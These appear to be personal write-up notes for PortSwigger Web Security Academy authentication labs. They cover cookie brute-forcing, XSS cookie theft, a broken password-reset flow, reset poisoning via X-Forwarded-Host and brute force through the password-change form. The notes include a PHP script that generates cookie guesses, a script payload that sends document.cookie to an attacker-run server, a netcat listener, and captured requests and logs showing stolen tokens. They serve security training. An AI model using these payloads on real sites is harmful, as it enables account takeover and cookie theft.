## Brute-forcing a stay-logged-in cookie

1. **Try to guess the pattern of cookie** some websites generate this cookie based on a predictable concatenation of static values, such as the **username and a timestamp**. Some even use the **password as part of the cookie**

2. In this cookie 
   
       d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
   
   The Pattern of this is
   
   ```js
   base64(username+':'+md5HashOfPassword)
   ```
   
   You Can write PHP Script for this with 
   
   ```php
   <?php
   foreach (file('pass_list.txt') as $passwd) {
       $hashed_password = md5($passwd);
       $credentials = 'username:' . $hashed_password;
       $encoded_credentials = base64_encode($credentials);
       echo $encoded_credentials . "\n";
   };  
   ?>
   ```
   
   one line 
   
   ```php
   <?php foreach(file('pass_list.txt') as $passwd) echo base64_encode('username:' . md5($passwd)) . "\n"; ?>
   ```
   
   You can do it also with burpsuite 
   
   in Intruder > Payloads > Under Payload processing in add the following rules in order. These rules will be applied sequentially to each payload before the request is submitted.
   
   - **Hash**: `MD5`
   
   - **Add prefix**: `wiener:`
   
   - **Encode**: `Base64-encode`

3. Then you can choose any of the brute force techniques mentioned above

## Offline password cracking + XSS

1. Login With Your Credential and in any where you have XSS write
   
   ```js
   <script>document.location="http://your_Server_You_Can_Use_ngrock/"+document.cookie</script>
   ```

2. Then in Your Server Logs 
   
   ```log
   10.0.3.25       2023-07-19 17:04:31 +0000 "GET /exploit/secret=XQQULTBLOU6nESqLiZppZ6hUjP5Ta0fu;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
   ```
   
   You Should Get a Cookie or useing 
   
   `nc -lnvp $server_port`
   
   ```log
   GET /my-account?id=carlos HTTP/2
   Host: 0a6d00cc03f6198083dc6562002c0083.web-security-academy.net
   Cookie: session=MMynDpTzubV8dpALFhJre7WY9LaoJ5pd; stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
   Accept-Language: en-US,en;q=0.5
   Accept-Encoding: gzip, deflate
   Origin: https://0a6d00cc03f6198083dc6562002c0083.web-security-academy.net
   Referer: https://0a6d00cc03f6198083dc6562002c0083.web-security-academy.net/login
   Upgrade-Insecure-Requests: 1
   Sec-Fetch-Dest: document
   Sec-Fetch-Mode: navigate
   Sec-Fetch-Site: same-origin
   Sec-Fetch-User: ?1
   Te: trailers
   ```

## Password reset broken logic

1. Create Account and press Linke `Forgot password?`

2. Write Your UserName or Email and Submit

3. Open Your Email InBox and Open Your Linke To Reset Your Password

4. Write Password in `New password`  And Rewrite it in `Confirm new password` 

5. Capture this request and Edit The hidden `username` parameter to any user that you want to change his Password and remove any `token`
   
   ```log
   POST /forgot-password?temp-forgot-password-token= HTTP/1.1
   Host: 0a5e001d0353593481a7a2b400eb006e.web-security-academy.net
   Cookie: session=JWYIopZvt94mdGBB7ILrSzDZP1FFYXtq
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
   Accept-Language: en-US,en;q=0.5
   Accept-Encoding: gzip, deflate
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 117
   Origin: https://0a5e001d0353593481a7a2b400eb006e.web-security-academy.net
   Referer: https://0a5e001d0353593481a7a2b400eb006e.web-security-academy.net/forgot-password?temp-forgot-password-token=O0X0kBigR29sLTYeQxuMga94zpJQG6jh
   Upgrade-Insecure-Requests: 1
   Sec-Fetch-Dest: document
   Sec-Fetch-Mode: navigate
   Sec-Fetch-Site: same-origin
   Sec-Fetch-User: ?1
   Te: trailers
   Connection: close
   
   temp-forgot-password-token=&username=carlos&new-password-1=peter&new-password-2=peter
   ```

6. Then Send This POST Request and try to login

## Password reset poisoning via middleware

1. Create Account and press Linke `Forgot password?`

2. Write Your UserName or Email and Submit and Capture This Request and Write This Header `X-Forwarded-Host` and See if this header allowed or not

3. if allowd then write after this header your host server and show your logs

```log
POST /forgot-password HTTP/2
Host: 0a6200e1042f715b82ee6f53002e00a4.web-security-academy.net
Cookie: session=Pu5kyEy9RS96Bus7mZ4UzJOtZt1atwTl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0a6200e1042f715b82ee6f53002e00a4.web-security-academy.net
Referer: https://0a6200e1042f715b82ee6f53002e00a4.web-security-academy.net/forgot-password
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
X-Forwarded-Host: your_Server_You_Can_Use_ngrock.com

username=Your_target_account_Name
```

   logs

```log
10.0.4.113      2023-07-19 17:38:13 +0000 "GET /exploit/forgot-password?temp-forgot-password-token=lZIHVoWn3lAtdfIJT5Rf44P8wjEHx92A HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
```

4. Copy The Token and Note it and copy ther reset linke that send to your Email in InBox : https://0a6200e1042f715b82ee6f53002e00a4.web-security-academy.net/forgot-password?temp-forgot-password-token=cBLgCTgK6nvF0wPXgZPUJ7fcqkh84NLw

5. And Replace This Token with Token that you noted it

6. Then Write Password in `New password` And Rewrite it in `Confirm new password`

7. Try to login with Target account with new password 

## Password brute-force via password change

1. Login with Your Credential and navigate change password page

2. write your current password and new password and confirm password and capture this request 

3. send this `request` to `burp intruder` and write your target account in
   
    `username` parameter and brute force the `current-pass` parameter with your wordlist add error massage to gerp mach or extrat add it if you want
